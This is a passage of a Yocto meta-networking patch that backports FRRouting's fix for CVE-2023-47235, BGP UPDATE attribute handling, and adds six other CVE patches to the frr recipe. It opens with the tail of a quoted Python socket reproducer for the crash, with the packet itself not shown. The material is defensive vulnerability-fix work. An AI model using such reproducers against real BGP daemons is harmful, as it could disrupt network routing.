+data = s.recv(1024)
+time.sleep(100)
+s.close()
+```
+
+Reported-by: Iggy Frankovic <iggyfran@amazon.com>
+Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
+
+CVE: CVE-2023-47235
+
+Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/6814f2e0138a6ea5e1f83bdd9085d9a77999900b]
+
+Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
+---
+ bgpd/bgp_attr.c | 15 ++++++++++++---
+ 1 file changed, 12 insertions(+), 3 deletions(-)
+
+diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
+index 13da27e99..1e08a218e 100644
+--- a/bgpd/bgp_attr.c
++++ b/bgpd/bgp_attr.c
+@@ -3050,10 +3050,13 @@ static int bgp_attr_check(struct peer *peer, struct attr *attr,
+	uint8_t type = 0;
+
+	/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an
+-	 * empty UPDATE.  */
++	 * empty UPDATE. Treat-as-withdraw, otherwise if we just ignore it,
++	 * we will pass it to be processed as a normal UPDATE without mandatory
++	 * attributes, that could lead to harmful behavior.
++	 */
+	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
+	    !length)
+-		return BGP_ATTR_PARSE_PROCEED;
++		return BGP_ATTR_PARSE_WITHDRAW;
+
+	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))
+		type = BGP_ATTR_ORIGIN;
+@@ -3477,7 +3480,13 @@ done:
+	}
+
+	transit = bgp_attr_get_transit(attr);
+-	if (ret != BGP_ATTR_PARSE_ERROR) {
++	/* If we received an UPDATE with mandatory attributes, then
++	 * the unrecognized transitive optional attribute of that
++	 * path MUST be passed. Otherwise, it's an error, and from
++	 * security perspective it might be very harmful if we continue
++	 * here with the unrecognized attributes.
++	 */
++	if (ret == BGP_ATTR_PARSE_PROCEED) {
+		/* Finally intern unknown attribute. */
+		if (transit)
+			bgp_attr_set_transit(attr, transit_intern(transit));
+--
+2.40.0
diff --git a/meta-networking/recipes-protocols/frr/frr_8.2.2.bb b/meta-networking/recipes-protocols/frr/frr_8.2.2.bb
index 58754b8256..03b106131f 100644
--- a/meta-networking/recipes-protocols/frr/frr_8.2.2.bb
+++ b/meta-networking/recipes-protocols/frr/frr_8.2.2.bb
@@ -21,6 +21,12 @@ SRC_URI = "git://github.com/FRRouting/frr.git;protocol=https;branch=stable/8.2 \
            file://CVE-2023-38802.patch \
            file://CVE-2023-41358.patch \
            file://CVE-2023-41909.patch \
+           file://CVE-2023-38406.patch \
+           file://CVE-2023-38407.patch \
+           file://CVE-2023-46752.patch \
+           file://CVE-2023-46753.patch \
+           file://CVE-2023-47234.patch \
+           file://CVE-2023-47235.patch \
            file://frr.pam \
 	      "
 
-- 
2.40.0


